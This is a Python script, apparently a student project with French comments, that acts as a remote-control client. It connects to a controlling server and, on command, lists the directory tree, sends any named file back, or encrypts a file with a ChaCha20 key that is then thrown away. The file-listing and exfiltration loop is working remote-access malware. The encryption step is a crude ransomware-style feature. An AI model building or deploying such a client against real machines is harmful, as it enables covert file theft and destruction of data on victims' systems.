import socket
import os 
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

#from chiffrement_chacha import generate_key, encrypt_file

#Fonction pour envoyer un message
def send_msg(sock, msg):
    msg_size = str(len(msg))
    tag = "MSG"
    msg_to_send = msg_size + "#" + tag + "#" + msg
    sock.sendall(msg_to_send.encode())

def send_file(sock, filename):
    try:
        with open(filename, 'rb') as file:
            file_data = file.read()
        file_tag = "FILE"
        header = f"{len(file_data)}#{file_tag}#{filename}#"
        message = header.encode() + file_data
        sock.sendall(message)
        print(f"File '{filename}' sent successfully.")
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")

#Fonction pour lister le répertoire et envoyer le résultat au serveur
def list_directory(sock):
    root_path = os.path.dirname(os.path.abspath(__file__))
    directory_contents = ""

    for root, dirs, files in os.walk(root_path):
        for name in dirs:
            directory_contents += f"{os.path.join(root, name)}\n"
        for name in files:
            directory_contents += f"{os.path.join(root, name)}\n"
    
    send_msg(sock, directory_contents.strip())

#Fonction pour recevoir la commande du serveur et la traiter
def recv_command(sock) :
    command = sock.recv(1024).decode().strip()
    if command.upper() == "LIST" :
        list_directory(sock)
    elif command.upper().startswith("DOWNLOAD") :
        action, filename = command.split(" ", 1)
        send_file(sock, filename)
    elif command.upper().startswith("ENCRYPT") :
        key = generate_key()
        action, filename = command.split(" ", 1)
        encrypted_data = encrypt_file(key, filename)
        with open('test.txt', 'wb') as f:
            f.write(encrypted_data)
        print(f"File {filename} encrypted.")
        send_msg(sock, "file successfully encrypted")
    else : 
        send_msg(sock, "Unknown command")
    return command        

#--------------------------------#
#       PARTIE CHIFFREMENT       #
#--------------------------------#

def generate_key():
    """Generates a symmetric key for encryption and decryption."""
    return ChaCha20Poly1305.generate_key()

def encrypt_file(key, input_file):
    """
    Encrypts the content of a given file using the provided key.
    Generates a random nonce for each encryption.
    """
    chacha = ChaCha20Poly1305(key)
    nonce = os.urandom(12)  # Generates a random 12-byte nonce

    with open(input_file, 'rb') as file:
        plaintext = file.read()
    
    encrypted_data = chacha.encrypt(nonce, plaintext, None)
    return nonce + encrypted_data  # Concatenates the nonce with the encrypted data

def decrypt_file(key, encrypted_file, output_file):
    """
    Decrypts an encrypted file using the provided key.
    Separates the nonce from the encrypted data before decryption.
    """
    chacha = ChaCha20Poly1305(key)

    with open(encrypted_file, 'rb') as file_enc:
        data = file_enc.read()
        nonce = data[:12]  # Extracts the nonce from the encrypted data
        encrypted_data = data[12:]
    
    decrypted_data = chacha.decrypt(nonce, encrypted_data, None)

    with open(output_file, 'wb') as file_dec:
        file_dec.write(decrypted_data)




host = '127.0.0.1'
port = 12347 
opt1_menu = "LIST : To list the file in the directory"
opt2_menu = "DOWNLOAD <filename> : To download a specific file"
opt3_menu = "ENCRYPT <filename> : To encrypt a specific file"
opt4_menu = "QUIT"

#Socket de connexion au serveur (Communication comprise)
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((host, port))
    menu = f"MENU\n{'-'*11}\n{opt1_menu}\n{opt2_menu}\n{opt3_menu}\n{opt4_menu}"
    send_msg(sock, menu)

    #Boucle pour continuer la communication tant que QUIT n'est pas reçu
    while True:
        response = recv_command(sock)
        if response.upper() == "QUIT":
            print("Server requested to quit.")
            break


